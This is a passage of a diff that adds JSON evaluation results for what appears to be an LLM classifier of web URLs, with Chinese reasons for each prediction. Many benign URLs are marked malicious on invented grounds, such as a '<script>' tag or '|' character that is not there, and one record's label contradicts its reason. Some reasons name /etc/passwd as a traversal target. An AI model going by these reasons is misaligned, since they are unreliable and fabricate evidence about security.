+    "true_label": "0"
+  },
+  {
+    "url": "/home_branding/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /home_branding 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.005,
+    "raw_response": "- 0 表示正常URL\n\nURL: /home_branding 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/867936/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /867936 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.01,
+    "raw_response": "- 0 表示正常URL\n\nURL: /867936 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/l2_mhss/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /l2_mhss/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.897,
+    "raw_response": "- 0 表示正常URL\n\nURL: /l2_mhss/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/193616/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /193616 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。因此，该URL是安全的。",
+    "elapsed_time_sec": 1.796,
+    "raw_response": "- 0 表示正常URL\n\nURL: /193616 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。因此，该URL是安全的。",
+    "true_label": "0"
+  },
+  {
+    "url": "/alfheim-angels share/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含“share”字样，这可能暗示了对敏感信息的访问，而“/alfheim-angels”可能暗示了对特定资源的访问，这与恶意攻击特征中的“文件包含”或“路径遍历”相关。此外，没有明显的SQL注入、XSS、命令执行或路径遍历的特征，但存在潜在的敏感信息访问。",
+    "elapsed_time_sec": 2.75,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含“share”字样，这可能暗示了对敏感信息的访问，而“/alfheim-angels”可能暗示了对特定资源的访问，这与恶意攻击特征中的“文件包含”或“路径遍历”相关。此外，没有明显的SQL注入、XSS、命令执行或路径遍历的特征，但存在潜在的敏感信息访问。",
+    "true_label": "0"
+  },
+  {
+    "url": "/textwht/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /textwht/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.818,
+    "raw_response": "- 0 表示正常URL\n\nURL: /textwht/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/137610/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /137610 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.027,
+    "raw_response": "- 0 表示正常URL\n\nURL: /137610 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/find.js",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.281,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/send.html",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.259,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/17519310/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /17519310 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.692,
+    "raw_response": "- 0 表示正常URL\n\nURL: /17519310 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/103632/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /103632 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.566,
+    "raw_response": "- 0 表示正常URL\n\nURL: /103632 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2162877/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /2162877/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.959,
+    "raw_response": "- 0 表示正常URL\n\nURL: /2162877/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/passive.cs",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.265,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ball_dress/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ball_dress 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.705,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ball_dress 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/funding.trace",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.318,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/179866/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /179866 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.594,
+    "raw_response": "- 0 表示正常URL\n\nURL: /179866 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/dan.aspx",
+    "predicted": "0",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/dan.aspx`路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，URL中没有正常的业务数据参数，也没有明显的SQL注入、命令注入或路径遍历特征。",
+    "elapsed_time_sec": 2.04,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript/dan.aspx`路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，URL中没有正常的业务数据参数，也没有明显的SQL注入、命令注入或路径遍历特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/image_1956957/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /image_1956957 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，且参数值为正常的业务数据，没有使用任何恶意攻击特征。因此，判定为正常请求。",
+    "elapsed_time_sec": 1.827,
+    "raw_response": "- 0 表示正常URL\n\nURL: /image_1956957 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，且参数值为正常的业务数据，没有使用任何恶意攻击特征。因此，判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/temp.yml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.225,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ganglia.phtml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ganglia.phtml`路径，这属于典型的XSS攻击特征，可能包含恶意脚本或远程代码执行。",
+    "elapsed_time_sec": 1.402,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ganglia.phtml`路径，这属于典型的XSS攻击特征，可能包含恶意脚本或远程代码执行。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rfc2044/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /rfc2044 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.524,
+    "raw_response": "- 0 表示正常URL\n\nURL: /rfc2044 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/incorporation/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.934,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/dclk.trace",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/dclk.trace`，其中`javascript`明显是XSS攻击的特征，且`trace`可能包含恶意脚本。此外，该URL中没有其他明显的恶意特征如SQL注入、命令执行等。",
+    "elapsed_time_sec": 1.851,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/dclk.trace`，其中`javascript`明显是XSS攻击的特征，且`trace`可能包含恶意脚本。此外，该URL中没有其他明显的恶意特征如SQL注入、命令执行等。",
+    "true_label": "0"
+  },
+  {
+    "url": "/5kp0320iki/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.992,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dl87393/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /dl87393 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.516,
+    "raw_response": "- 0 表示正常URL\n\nURL: /dl87393 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/baseballsports_article/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.944,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/internet.db",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`internet.db`，明显涉及JavaScript代码，这属于XSS攻击特征，且代码中包含`javascript`等跨站脚本攻击特征。",
+    "elapsed_time_sec": 1.526,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`internet.db`，明显涉及JavaScript代码，这属于XSS攻击特征，且代码中包含`javascript`等跨站脚本攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ecobra/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ecobra/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.704,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ecobra/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/room.db",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `room.db`（路径遍历）",
+    "elapsed_time_sec": 1.238,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `room.db`（路径遍历）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/reporting.html",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/reporting.html`，其中`javascript`是典型的XSS攻击特征，且`reporting.html`可能包含恶意脚本。此外，该URL的路径结构可能被用来执行远程命令或访问敏感文件，因此属于恶意攻击特征。",
+    "elapsed_time_sec": 2.026,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/reporting.html`，其中`javascript`是典型的XSS攻击特征，且`reporting.html`可能包含恶意脚本。此外，该URL的路径结构可能被用来执行远程命令或访问敏感文件，因此属于恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/t15064/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /t15064 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.508,
+    "raw_response": "- 0 表示正常URL\n\nURL: /t15064 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rulesguys/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /rulesguys/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.668,
+    "raw_response": "- 0 表示正常URL\n\nURL: /rulesguys/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/227049/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /227049 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.566,
+    "raw_response": "- 0 表示正常URL\n\nURL: /227049 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/110554/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /110554 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.532,
+    "raw_response": "- 0 表示正常URL\n\nURL: /110554 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/pcmcia_ci10413/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.912,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/hti_journals/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /hti_journals/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.592,
+    "raw_response": "- 0 表示正常URL\n\nURL: /hti_journals/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/greatcnrrgt1blk2a/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.896,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20011019-10/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20011019-10 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.605,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20011019-10 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/54608267/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /54608267 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.577,
+    "raw_response": "- 0 表示正常URL\n\nURL: /54608267 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/la guerre des mondes/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.879,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/examples/jsp/jsp2/el/index.php?file=news&op=phpinfo",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/examples/jsp/jsp2/el/index.php`的路径，且`file=news`参数，这属于路径遍历攻击特征。此外，`phpinfo`函数的调用也暗示了潜在的代码注入或远程代码执行风险。",
+    "elapsed_time_sec": 1.974,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/examples/jsp/jsp2/el/index.php`的路径，且`file=news`参数，这属于路径遍历攻击特征。此外，`phpinfo`函数的调用也暗示了潜在的代码注入或远程代码执行风险。",
+    "true_label": "0"
+  },
+  {
+    "url": "/mshafer/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /mshafer/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.681,
+    "raw_response": "- 0 表示正常URL\n\nURL: /mshafer/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/sun.doc",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/sun.doc`路径，这属于典型的XSS攻击特征，恶意代码可能被执行或注入到服务器中。",
+    "elapsed_time_sec": 1.447,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/sun.doc`路径，这属于典型的XSS攻击特征，恶意代码可能被执行或注入到服务器中。",
+    "true_label": "0"
+  },
+  {
+    "url": "/sensation 2005 white/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历（`/sensation 2005 white/`），路径遍历攻击通常通过包含敏感路径或远程文件访问来实现。",
+    "elapsed_time_sec": 1.545,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历（`/sensation 2005 white/`），路径遍历攻击通常通过包含敏感路径或远程文件访问来实现。",
+    "true_label": "0"
+  },
+  {
+    "url": "/u740147/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /u740147 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.633,
+    "raw_response": "- 0 表示正常URL\n\nURL: /u740147 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/poster1-s/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /poster1-s/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.244,
+    "raw_response": "- 0 表示正常URL\n\nURL: /poster1-s/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/austin_print/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /austin_print/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.657,
+    "raw_response": "- 0 表示正常URL\n\nURL: /austin_print/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/peerreg/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /peerreg/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.637,
+    "raw_response": "- 0 表示正常URL\n\nURL: /peerreg/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/author_bio/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /author_bio/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.961,
+    "raw_response": "- 0 表示正常URL\n\nURL: /author_bio/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/butalbital_compound/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.948,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bizwidget/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /bizwidget/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.915,
+    "raw_response": "- 0 表示正常URL\n\nURL: /bizwidget/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/978400/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /978400/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.295,
+    "raw_response": "- 0 表示正常URL\n\nURL: /978400/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/elearners_22c/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /elearners_22c/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.558,
+    "raw_response": "- 0 表示正常URL\n\nURL: /elearners_22c/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/jfk reloaded 1/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历（`/jfk reloaded 1/`）和参数值的异常。路径遍历攻击通常通过包含敏感路径如 `/etc/passwd` 或 `/etc/shadow` 来执行恶意操作，因此判定为异常。",
+    "elapsed_time_sec": 2.078,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为路径遍历（`/jfk reloaded 1/`）和参数值的异常。路径遍历攻击通常通过包含敏感路径如 `/etc/passwd` 或 `/etc/shadow` 来执行恶意操作，因此判定为异常。",
+    "true_label": "0"
+  },
+  {
+    "url": "/170273/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /170273 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.565,
+    "raw_response": "- 0 表示正常URL\n\nURL: /170273 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/physics-structuralism/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /physics-structuralism/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.72,
+    "raw_response": "- 0 表示正常URL\n\nURL: /physics-structuralism/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/report.ep",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`report.ep`，这属于路径遍历攻击特征。",
+    "elapsed_time_sec": 1.256,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`report.ep`，这属于路径遍历攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ns.log",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/ns.log`，其中`javascript`和`log`等关键字与SQL注入、XSS等攻击特征相关。该URL包含恶意代码，可能用于执行远程命令或注入攻击。",
+    "elapsed_time_sec": 1.801,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/ns.log`，其中`javascript`和`log`等关键字与SQL注入、XSS等攻击特征相关。该URL包含恶意代码，可能用于执行远程命令或注入攻击。",
+    "true_label": "0"
+  },
+  {
